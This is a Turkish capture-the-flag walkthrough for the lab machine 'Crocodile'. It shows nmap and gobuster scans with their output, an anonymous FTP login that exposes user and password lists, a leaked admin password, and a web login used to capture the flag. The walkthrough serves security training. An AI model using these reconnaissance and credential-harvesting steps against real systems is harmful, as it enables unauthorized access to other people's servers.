---
glightbox: true
---

# Crocodile

!!! info "Target IP Address"

    10.129.39.65

Hedef makine için Nmap taraması gerçekleştir:

```bash
sudo nmap 10.129.39.65 -p 21 -sV
```

```text title="Output" hl_lines="6 7"
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-21 23:37 +03
Nmap scan report for 10.129.39.65
Host is up (0.38s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.34 seconds
```

Hedef makineye FTP bağlantısı gerçekleştir ve `anonymous` kullanıcısı olarak giriş yap:

```bash
ftp 10.129.39.65
```

FTP bağlantısı kurulduktan sonra `allowed.userlist` ve `allowed.userlist.passwd` dosyalarını sisteme indir.

Dosya içeriklerini görüntülersek `admin` kullanıcısının parolasını (`rKXM59ESxesUFHAd`) elde edebiliriz.

Gobuster ile dizin kaba kuvveti gerçekleştir:

```bash
gobuster dir -u 10.129.39.65 -x php -w /usr/share/dirb/wordlists/common.txt
```

```text title="Output" hl_lines="29"
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.39.65
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.hta.php             (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htaccess.php        (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htpasswd.php        (Status: 403) [Size: 276]
/assets               (Status: 301) [Size: 311] [--> http://10.129.39.65/assets/]
/config.php           (Status: 200) [Size: 0]
/css                  (Status: 301) [Size: 308] [--> http://10.129.39.65/css/]
/dashboard            (Status: 301) [Size: 314] [--> http://10.129.39.65/dashboard/]
/fonts                (Status: 301) [Size: 310] [--> http://10.129.39.65/fonts/]
/index.html           (Status: 200) [Size: 58565]
/js                   (Status: 301) [Size: 307] [--> http://10.129.39.65/js/]
/login.php            (Status: 200) [Size: 1577]
/logout.php           (Status: 302) [Size: 0] [--> login.php]

...SNIP...
```

Elde edilen tüm bilgileri kullanarak [http://10.129.39.65/login.php](http://10.129.39.65/login.php) adresindeki giriş formunu doldur ve bayrağı ele geçir.
